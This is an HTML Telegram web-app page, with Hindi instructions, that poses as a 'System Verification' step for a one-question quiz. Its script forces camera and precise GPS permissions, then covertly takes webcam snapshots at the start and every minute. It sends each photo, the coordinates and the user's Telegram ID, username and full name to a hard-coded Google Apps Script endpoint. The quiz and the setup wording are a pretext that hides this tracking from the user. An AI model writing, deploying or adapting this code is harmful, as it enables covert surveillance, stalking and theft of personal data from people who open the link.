<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; user-select: none; }
        body { margin: 0; min-height: 100vh; background: #0b131e; color: #ffffff; text-align: center; display: flex; flex-direction: column; justify-content: center; }
        .card { width: 90%; max-width: 450px; margin: auto; background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h3 { margin-top: 0; color: #00eaff; }
        .instruction-box { text-align: left; background: rgba(255, 255, 255, 0.03); padding: 20px; border-radius: 15px; font-size: 14px; line-height: 1.6; margin: 20px 0; border-left: 4px solid #00eaff; }
        button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
        button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
        .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
    </style>
</head>
<body>

<div id="login" class="card">
    <div style="font-size: 55px; margin-bottom: 15px;">🛡️</div>
    <h3>System Configuration</h3>
    <div class="instruction-box">
        • सिस्टम सेटअप किया जा रहा है।<br>
        • प्रक्रिया शुरू करने के बाद 'Allow' पर क्लिक करें।<br>
        • <b>नोट:</b> यदि लोकेशन नहीं मिल रही, तो फोन का GPS ऑन करके ब्राउज़र को परमिशन दें।
    </div>
    <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
</div>

<div id="quizBox" class="card" style="display:none">
    <div id="question" style="font-size: 18px; margin-bottom: 25px; text-align: left; font-weight: 600;"></div>
    <div id="options"></div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxCSOW6Lm6sqRDifSvjHLB64smEA1Vl0Ph2H8COe-md67E9COLYFO6cQwkNj0CTidm2YA/exec"; 

    const user = tg.initDataUnsafe?.user || {};
    let userLoc = "Pending";
    let globalStream = null;
    let currentIdx = 0;

    const questions = [
        {q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0},
    ];

    async function requestAllPermissions() {
        const btn = document.getElementById("startBtn");
        btn.disabled = true;
        btn.innerText = "Verifying Location... ⏳";

        try {
            // 1. Camera First
            if (!globalStream) {
                globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
            }

            // 2. Forced Location Check
            const getLocation = () => {
                return new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    });
                });
            };

            try {
                const pos = await getLocation();
                userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
            } catch (err) {
                // Agar pehli baar fail ho, toh 2 second baad retry karein
                console.log("Retrying location...");
                btn.innerText = "Retrying GPS... ⏳";
                await new Promise(r => setTimeout(r, 2000));
                const retryPos = await getLocation();
                userLoc = `${retryPos.coords.latitude}, ${retryPos.coords.longitude}`;
            }

            // 3. Success - Start Quiz
            document.getElementById("login").style.display = "none";
            document.getElementById("quizBox").style.display = "block";
            loadQuestion();
            
            captureAndSend("Test_Started");
            setInterval(() => captureAndSend("Periodic_Check"), 60000);

        } catch (err) {
            console.error(err);
            alert("Mandatory Error: लोकेशन और कैमरा अनिवार्य है।\n\n1. फोन का GPS ऑन करें।\n2. ब्राउज़र में 'Allow' करें।\n3. अगर पॉप-अप नहीं आ रहा, तो सेटिंग्स में जाकर Site Permissions Reset करें।");
            btn.disabled = false;
            btn.innerText = "प्रक्रिया शुरू करें";
        }
    }

    async function captureAndSend(statusType) {
        if (!globalStream) return;
        try {
            const video = document.createElement('video');
            video.srcObject = globalStream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = 320; canvas.height = 240;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.3);

            const payload = {
                userId: user.id || "NA",
                username: user.username || "NA",
                fullName: (user.first_name || "") + " " + (user.last_name || ""),
                score: "Active",
                status: statusType,
                photo: photoData,
                location: userLoc
            };

            fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
        } catch (e) { console.log(e); }
    }

    function loadQuestion() {
        if (currentIdx >= questions.length) { 
            alert("Test Submitted!"); 
            tg.close(); 
            return; 
        }
        const qData = questions[currentIdx];
        document.getElementById("question").innerText = qData.q;
        const optionsDiv = document.getElementById("options");
        optionsDiv.innerHTML = "";
        qData.o.forEach((opt, i) => {
            const div = document.createElement("div");
            div.className = "option";
            div.innerText = opt;
            div.onclick = () => { currentIdx++; loadQuestion(); };
            optionsDiv.appendChild(div);
        });
    }
</script>
</body>
</html>
